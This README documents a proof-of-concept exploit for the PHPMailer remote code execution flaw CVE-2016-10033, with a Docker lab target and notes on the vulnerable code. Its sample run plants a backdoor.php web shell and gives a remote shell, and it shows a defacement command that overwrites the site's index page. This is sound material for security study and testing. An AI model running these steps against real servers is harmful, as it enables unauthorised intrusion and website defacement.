# PHPMailer < 5.2.18 Remote Code Execution
[![Docker Pulls](https://img.shields.io/docker/pulls/vulnerables/cve-2016-10033.svg?style=plastic)](https://hub.docker.com/r/vulnerables/cve-2016-10033/)
![License](https://img.shields.io/badge/License-GPL-blue.svg?style=plastic)

PHPMailer is the world's most popular transport class, with an estimated 9 million users worldwide. Downloads continue at a significant pace daily. Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more

PHPMailer before its version 5.2.18 suffer from a vulnerability that could lead to remote code execution (RCE). If a very specific condition is met, a remote server can be compromised. This condition is specified in ```Vulnerable Code``` section bellow.

## Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033

And it will spawn a vulnerable web application on your host on ```8080``` port

![vulnerable](/vulnerable.png)

## Exploit

To exploit this target just run:

    ./exploit host:port

If you are using this vulnerable image, you can just run:

    ./exploit localhost:8080

After the exploitation, a file called backdoor.php will be stored on the root folder of the web directory. And the exploit will drop you a shell where you can send commands to the backdoor:

    ./exploit.sh localhost:8080
    [+] CVE-2016-10033 exploit by opsxcq
    [+] Exploiting localhost:8080
    [+] Target exploited, acessing shell at http://localhost:8080/backdoor.php
    [+] Running whoami
    www-data
    RemoteShell> echo 'Defaced' > /www/index.php
    [+] Running echo 'Defaced' > /www/index.php

And if you visit the page again, you will see this:

![defaced](defaced.png)


## Vulnerable code

Before this [commit](https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc) in [class.phpmailer.php](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L1446) in a certain scenarion there is no filter in the sender's email address special chars. This flaw can lead to a remote code execution, via ```mail``` function [here](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L700).

To trigger this code, you need:

    * PHPMailer < 5.2.18
    * Compile PHP without PCRE.
    * PHP version must be inferior to 5.2.0.

So you can bypass the sender's email validation on ```validateAddress``` function, setting ```patternselect``` to ```noregex```. To make easier to archieve such environment without having to setup PHP like this I just [hardcoded it](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L1102).


## Credits

This vulnerability was found by Dawid Golunski.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (opsxcq) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not opsxcq's responsibility.
